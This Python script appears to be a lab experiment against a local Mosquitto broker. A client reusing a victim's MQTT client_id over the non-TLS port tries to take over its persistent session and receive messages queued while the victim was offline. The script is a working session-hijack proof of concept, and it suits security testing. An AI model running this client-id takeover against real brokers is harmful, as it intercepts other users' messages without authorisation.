#!/usr/bin/env python3
"""
MQTT Security Experiment: Session Hijacking Demonstration (MQTT v5, Paho, Callback API v2)

Flow:
1) Victim (TLS/8883) connects with clean_start=0 + SessionExpiryInterval>0, subscribes, disconnects (session persists)
2) Publisher (TLS/8883, stateless) publishes QoS1 while victim is offline (messages should be queued in victim's session)
3) Attacker (non-TLS/1883) connects using SAME client_id, clean_start=0, tries to drain queued messages
4) Results reported

Notes:
- Requires Mosquitto configured with TLS on 8883 and a non-TLS listener on 1883.
"""

import json
import logging
import ssl
import time
import threading
from datetime import datetime

import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes

# -----------------------
# Logging
# -----------------------
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("mqtt-experiment")

# -----------------------
# Broker / Test Config
# -----------------------
BROKER_HOST = "localhost"
TLS_PORT = 8883
NON_TLS_PORT = 1883

CLIENT_ID = "test_victim"   # victim's client_id; attacker reuses this
TOPIC = "test/topic"
QOS = 1                                  # QoS1 required for broker queueing
SESSION_EXPIRY = 3600                    # seconds; victim session retained on broker after disconnect
MSG_EXPIRY = 300                         # seconds; add to PUBLISH so messages don't expire too soon

# TLS certificate paths (adjust paths)
CA_CERT = "ca.crt"
CLIENT_CERT = "client.crt"
CLIENT_KEY = "client.key"

# Timeouts
CONNECT_TIMEOUT = 8
SUB_TIMEOUT = 8
DRAIN_WAIT = 8
PUBLISH_WAIT = 8

# -----------------------
# Experiment Class
# -----------------------
class MQTTExperiment:
    def __init__(self):
        self.messages_received = []
        self.victim_connected = threading.Event()
        self.attacker_connected = threading.Event()

    # ---------- v5 Callbacks (Callback API v2 signatures) ----------
    def on_connect(self, client, userdata, flags, reason_code, properties=None):
        ctype = userdata.get("client_type", "unknown")
        logger.info(f"[{ctype}] on_connect: reason_code={reason_code}")
        if reason_code == 0:
            if ctype == "victim":
                self.victim_connected.set()
            elif ctype == "attacker":
                self.attacker_connected.set()

    def on_disconnect(self, client, userdata, flags, reason_code, properties=None):
        """Callback for when the client disconnects from the server."""
        client_type = userdata.get('client_type', 'unknown')
        logger.info(f"[{client_type}] Disconnected with reason code {reason_code}")
        if client_type == "victim":
            self.victim_connected = False
        elif client_type == "attacker":
            self.attacker_connected = False


    def on_message(self, client, userdata, msg):
        """Callback for when a PUBLISH message is received from the server."""
        client_type = userdata.get('client_type', 'unknown')
        message = {
            'timestamp': datetime.now().isoformat(),
            'client_type': client_type,
            'topic': msg.topic,
            'payload': msg.payload.decode(),
            'qos': msg.qos
        }
        self.messages_received.append(message)
        logger.info(f"[{client_type}] Received message: {msg.topic} - {msg.payload.decode()}")

    def on_publish(self, client, userdata, mid, reason_code=None, properties=None):
        """Callback for when a message is published."""
        client_type = userdata.get('client_type', 'unknown')
        if reason_code is None or reason_code == 0:  # Success
            logger.info(f"[{client_type}] Message published successfully (mid: {mid})")
        else:
            logger.warning(f"[{client_type}] Publish failed: {reason_code}")

    # ---------- Client Builders ----------
    def _base_client(self, client_id: str, client_type: str, use_tls: bool):
        c = mqtt.Client(
            client_id=client_id,
            protocol=mqtt.MQTTv5,
            callback_api_version=CallbackAPIVersion.VERSION2,
        )
        c.user_data_set({"client_type": client_type})
        c.on_connect = self.on_connect
        c.on_disconnect = self.on_disconnect
        c.on_message = self.on_message

        if use_tls:
            # Strong, modern defaults (TLS 1.2/1.3)
            c.tls_set(
                ca_certs=CA_CERT,
                certfile=CLIENT_CERT,
                keyfile=CLIENT_KEY,
                tls_version=ssl.PROTOCOL_TLS_CLIENT,
            )
            # Keep default verification; if using self-signed CA, CA_CERT must be that CA
        return c

    def victim_client(self):
        return self._base_client(CLIENT_ID, "victim", use_tls=True)

    def attacker_client(self):
        # Attacker reuses the victim's client_id but connects over non-TLS
        return self._base_client(CLIENT_ID, "attacker", use_tls=False)

    def publisher_client(self):
        # Stateless publisher (separate client_id)
        c = self._base_client("test_publisher", "publisher", use_tls=True)
        c.on_publish = self.on_publish
        return c

    # ---------- Connect helpers (v5 clean-start + properties) ----------
    @staticmethod
    def connect_v5(client: mqtt.Client, host: str, port: int, *, clean_start, session_expiry: int):
        props = Properties(PacketTypes.CONNECT)
        props.SessionExpiryInterval = session_expiry
        client.connect(host, port, clean_start=clean_start, properties=props)
        client.loop_start()

    # -----------------------
    # Experiment Phases
    # -----------------------
    def phase_1_victim_establish_persistent_session(self):
        """
        Victim creates/updates a persistent session:
        - clean_start = 0 (resume or create persistent session)
        - SessionExpiryInterval > 0
        - subscribes to TOPIC at QoS1
        """
        logger.info("\n--- Phase 1: Victim connects (TLS), subscribes, then disconnects (session persists) ---")
        victim = self.victim_client()
        self.connect_v5(victim, BROKER_HOST, TLS_PORT,
                        clean_start=0,
                        session_expiry=SESSION_EXPIRY)

        if not self.victim_connected.wait(CONNECT_TIMEOUT):
            victim.loop_stop()
            raise RuntimeError("Victim failed to connect in time")

        # Subscribe to the topic; wait for SUBACK by briefly listening
        sub_mid = victim.subscribe(TOPIC, qos=QOS)[1]
        logger.info(f"[victim] SUBSCRIBE sent (mid={sub_mid}) to {TOPIC} QoS={QOS}")
        time.sleep(0.5)  # tiny grace so broker persists subscription into session

        victim.disconnect()
        victim.loop_stop()
        logger.info("[victim] disconnected; session should persist on broker")

    def phase_2_publisher_send_while_victim_offline(self):
        """
        Stateless publisher sends QoS1 messages while victim is offline.
        - clean_start = 1 (no session)
        - SessionExpiryInterval = 0 (no session retention)
        - Publish with MessageExpiryInterval to be safe.
        """
        logger.info("\n--- Phase 2: Publisher sends messages while victim offline (TLS) ---")
        pub = self.publisher_client()
        self.connect_v5(pub, BROKER_HOST, TLS_PORT,
                        clean_start=1,
                        session_expiry=0)

        pub_props = Properties(PacketTypes.PUBLISH)
        pub_props.MessageExpiryInterval = MSG_EXPIRY

        msgs = [
            f"CRITICAL: Message while victim offline (t={datetime.now().isoformat()}) #1",
            f"CRITICAL: Message while victim offline (t={datetime.now().isoformat()}) #2",
        ]
        for m in msgs:
            info = pub.publish(TOPIC, m, qos=QOS, properties=pub_props)
            info.wait_for_publish()

        time.sleep(0.5)
        pub.disconnect()
        pub.loop_stop()
        logger.info(f"[publisher] published {len(msgs)} messages")

    def phase_3_attacker_attempt_hijack(self):
        """
        Attacker connects non-TLS to 1883 using SAME client_id and tries to drain queued messages.
        - clean_start = 0
        - SessionExpiryInterval > 0 (attempt to bind to the persisted session)
        """
        logger.info("\n--- Phase 3: Attacker attempts to hijack session on 1883 (non-TLS) ---")
        attacker = self.attacker_client()
        self.connect_v5(attacker, BROKER_HOST, NON_TLS_PORT,
                        clean_start=0,
                        session_expiry=SESSION_EXPIRY)

        # If hijack succeeds, queued messages would be delivered here
        self.attacker_connected.wait(CONNECT_TIMEOUT)
        time.sleep(DRAIN_WAIT)

        attacker.disconnect()
        attacker.loop_stop()
        logger.info("[attacker] disconnected")

    # Optional: victim proof step (reconnect and drain)
    def phase_4_victim_reconnect_and_drain(self, expected=2):
        """
        Victim reconnects (TLS) with clean_start=0 and SessionExpiryInterval>0 to receive any queued messages.
        """
        logger.info("\n--- Phase 4: Victim reconnects to drain any remaining queued messages ---")
        self.victim_connected.clear()
        victim = self.victim_client()
        self.connect_v5(victim, BROKER_HOST, TLS_PORT,
                        clean_start=0,
                        session_expiry=SESSION_EXPIRY)

        if not self.victim_connected.wait(CONNECT_TIMEOUT):
            victim.loop_stop()
            raise RuntimeError("Victim failed to reconnect in time")

        # Wait for broker to push queued messages
        end = time.time() + DRAIN_WAIT
        while time.time() < end and len([m for m in self.messages_received if m["client_type"] == "victim"]) < expected:
            time.sleep(0.1)

        victim.disconnect()
        victim.loop_stop()

    # -----------------------
    # Orchestration + Analysis
    # -----------------------
    def run(self):
        logger.info("=== MQTT v5 Session Hijacking Security Experiment ===")
        try:
            self.phase_1_victim_establish_persistent_session()
            self.phase_2_publisher_send_while_victim_offline()
            self.phase_3_attacker_attempt_hijack()
            self.analyze_results()
            return True
        except Exception as e:
            logger.exception(f"Experiment failed: {e}")
            return False
        finally:
            logger.info("=== Experiment Complete ===")

    def analyze_results(self):
        victim_msgs = [m for m in self.messages_received if m["client_type"] == "victim"]
        attacker_msgs = [m for m in self.messages_received if m["client_type"] == "attacker"]

        logger.info("\n--- Results ---")
        logger.info(f"Attacker received messages: {len(attacker_msgs)}")

        if attacker_msgs:
            logger.critical("VULNERABILITY CONFIRMED: Attacker drained queued messages!")
            for m in attacker_msgs:
                logger.critical(f"  [attacker] {m['timestamp']}  {m['payload']}")
        else:
            logger.info("No session hijacking observed (attacker received nothing)")



# -----------------------
# Main
# -----------------------
def main():
    print("MQTT Security Experiment (MQTT v5, Callback API v2)")
    print("Ensure your broker is running with TLS on 8883 and a non-TLS listener on 1883.")
    input("Press Enter to start... ")

    exp = MQTTExperiment()
    ok = exp.run()

    with open("mqtt_hijack_experiment_results.json", "w", encoding="utf-8") as f:
        json.dump({
            "ok": ok,
            "messages": exp.messages_received,
            "timestamp": datetime.now().isoformat(),
        }, f, indent=2)
    logger.info("Results saved -> mqtt_hijack_experiment_results.json")

if __name__ == "__main__":
    main()
